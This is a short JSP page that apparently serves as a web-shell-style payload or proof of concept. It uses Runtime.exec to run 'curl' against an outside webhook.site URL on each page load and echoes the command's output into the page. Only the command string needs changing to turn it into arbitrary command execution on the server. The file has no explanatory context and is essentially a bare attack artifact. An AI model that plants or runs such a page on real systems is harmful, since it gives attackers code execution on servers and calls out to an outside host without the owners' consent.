<%@ page import="java.util.*,java.io.*"%>
<pre>
<%
	Process p = Runtime.getRuntime().exec("curl https://webhook.site/dee0c407-1982-4e24-a388-0f3e32637cca");
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	while ( disr != null ) {
			out.println(disr); 
			disr = dis.readLine(); 
	}
%>
</pre>
